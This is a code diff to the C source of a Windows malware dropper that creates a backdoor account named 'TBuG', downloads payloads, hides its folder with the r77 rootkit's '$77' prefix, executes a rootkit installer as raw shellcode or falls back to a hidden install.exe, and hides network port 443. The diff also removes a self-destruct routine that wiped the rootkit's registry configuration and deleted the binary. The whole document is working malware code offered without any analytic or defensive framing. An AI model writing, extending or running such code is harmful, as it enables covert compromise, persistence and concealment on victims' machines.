@@ -19,7 +19,7 @@
 static const char* g_backdoorUsername = "TBuG";
 static BOOL g_accountCreated = FALSE;
 static char g_mallDir[MAX_PATH] = {0};
-static char g_svchostPath[MAX_PATH] = {0};  // Added for persistence
+static char g_svchostPath[MAX_PATH] = {0};
 
 // Function prototypes
 unsigned char* ObfuscateString(const char* input, size_t len, DWORD key);
@@ -33,7 +33,6 @@ void DownloadFile(const char* url, const char* savePath);
 void DownloadAndExecutePayloads();
 void AddToStartup(const char* appName, const char* appPath);
 void EstablishPersistence();
-void SelfDestruct();
 void RemoveBackdoorAccount();
 void CleanupTemporaryResources();
 BOOL IsDebugged();
@@ -360,9 +359,9 @@ void DownloadAndExecutePayloads() {
     lstrcpyA(templatesDir, appDataPath);
     lstrcatA(templatesDir, "\\Microsoft\\Windows\\Templates");
     
-    // Ensure mall directory exists
+    // Ensure hidden directory exists (using $77 prefix for auto-hiding)
     lstrcpyA(g_mallDir, templatesDir);
-    lstrcatA(g_mallDir, "\\mall");
+    lstrcatA(g_mallDir, "\\$77-mall");  // Hidden directory name
     
     if (GetFileAttributesA(g_mallDir) == INVALID_FILE_ATTRIBUTES) {
         CreateDirectoryA(g_mallDir, NULL);
@@ -397,11 +396,15 @@ void DownloadAndExecutePayloads() {
     // Execute extraction hidden
     RunHiddenCommand(psCmd);
     
-    // ===== SHELLCODE INSTALLATION START =====
-    // 1. Install r77 rootkit via shellcode
+    // ===== SHELLCODE INSTALLATION =====
+    // 1. Install r77 rootkit via shellcode or fallback to EXE
     char shellcodePath[MAX_PATH];
     lstrcpyA(shellcodePath, g_mallDir);
-    lstrcatA(shellcodePath, "\\install.shellcode");  // Shellcode version
+    lstrcatA(shellcodePath, "\\install.shellcode");
+    
+    char r77Path[MAX_PATH];
+    lstrcpyA(r77Path, g_mallDir);
+    lstrcatA(r77Path, "\\install.exe");
     
     HANDLE hFile = CreateFileA(shellcodePath, GENERIC_READ, FILE_SHARE_READ, 
                               NULL, OPEN_EXISTING, 0, NULL);
@@ -417,18 +420,46 @@ void DownloadAndExecutePayloads() {
                 if (ReadFile(hFile, shellcode, fileSize, &bytesRead, NULL) && 
                     bytesRead == fileSize) {
                     
-                    // Execute shellcode in a new thread
-                    HANDLE hThread = CreateThread(NULL, 0, 
-                        (LPTHREAD_START_ROUTINE)shellcode, NULL, 0, NULL);
-                    if (hThread) {
-                        WaitForSingleObject(hThread, 30000);  // Wait 30s for installation
-                        CloseHandle(hThread);
+                    // Verify MZ header before execution
+                    BOOL validShellcode = FALSE;
+                    if (bytesRead >= 2) {
+                        BYTE* scBytes = (BYTE*)shellcode;
+                        if (scBytes[0] == 'M' && scBytes[1] == 'Z') {
+                            validShellcode = TRUE;
+                        }
+                    }
+                    
+                    if (validShellcode) {
+                        // Execute shellcode directly
+                        void (*shellcode_func)() = (void (*)())shellcode;
+                        shellcode_func();
+                        
+                        // Allow time for installation
+                        Sleep(30000);
+                    } else {
+                        // Fallback to EXE execution
+                        STARTUPINFOA si = { sizeof(si) };
+                        PROCESS_INFORMATION pi;
+                        CreateProcessA(r77Path, NULL, NULL, NULL, FALSE, 
+                                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+                        WaitForSingleObject(pi.hProcess, 30000);
+                        CloseHandle(pi.hProcess);
+                        CloseHandle(pi.hThread);
                     }
                 }
                 // Don't free memory - shellcode may still be active
             }
         }
         CloseHandle(hFile);
+    } else {
+        // Shellcode file not found - fallback to EXE
+        STARTUPINFOA si = { sizeof(si) };
+        PROCESS_INFORMATION pi;
+        CreateProcessA(r77Path, NULL, NULL, NULL, FALSE, 
+                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+        WaitForSingleObject(pi.hProcess, 30000);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
     }
 
     // 2. Configure network port hiding for port 443
@@ -535,7 +566,8 @@ void CleanupTemporaryResources() {
     // Cleanup only the zip file
     char zipPath[MAX_PATH];
     lstrcpyA(zipPath, g_mallDir);
-    lstrcatA(zipPath, "\\..\\mall.zip");
+    PathRemoveFileSpecA(zipPath);  // Go up to parent directory
+    lstrcatA(zipPath, "\\mall.zip");
     DeleteFileA(zipPath);
     
     // Cleanup temporary batch file
@@ -543,36 +575,6 @@ void CleanupTemporaryResources() {
     GetTempPathA(MAX_PATH, batchPath);
     lstrcatA(batchPath, "\\sysclean.bat");
     DeleteFileA(batchPath);
-}
-
-// Self-destruction
-void SelfDestruct() {
-    // Remove r77 configuration
-    RunHiddenCommand("reg delete HKLM\\SOFTWARE\\$77config /f");
-    
-    char batchPath[MAX_PATH];
-    GetTempPathA(MAX_PATH, batchPath);
-    lstrcatA(batchPath, "\\sysclean.bat");
-    
-    HANDLE hFile = CreateFileA(batchPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
-    if(hFile != INVALID_HANDLE_VALUE) {
-        char selfPath[MAX_PATH];
-        GetModuleFileNameA(NULL, selfPath, MAX_PATH);
-        
-        DWORD bytesWritten;
-        char fmt[] = "@echo off\r\n:loop\r\ndel \"%s\" >nul 2>&1\r\nif exist \"%s\" goto loop\r\ndel \"%%~f0\"\r\n";
-        int bufSize = lstrlenA(fmt) + 2*lstrlenA(selfPath) + 1;
-        char* cmd = (char*)malloc(bufSize);
-        if (cmd) {
-            wsprintfA(cmd, fmt, selfPath, selfPath);
-            WriteFile(hFile, cmd, lstrlenA(cmd), &bytesWritten, NULL);
-            free(cmd);
-        }
-        CloseHandle(hFile);
-        
-        // Execute batch
-        ShellExecuteA(NULL, "open", batchPath, NULL, NULL, SW_HIDE);
-    }
 }
 
 // Main entry point
@@ -624,8 +626,5 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     // Remove temporary resources but preserve payloads
     CleanupTemporaryResources();
     
-    // Self-destruct initial executable
-    SelfDestruct();
-    
-    return 0;
+    return 0;  // Normal exit without self-destruction
 }
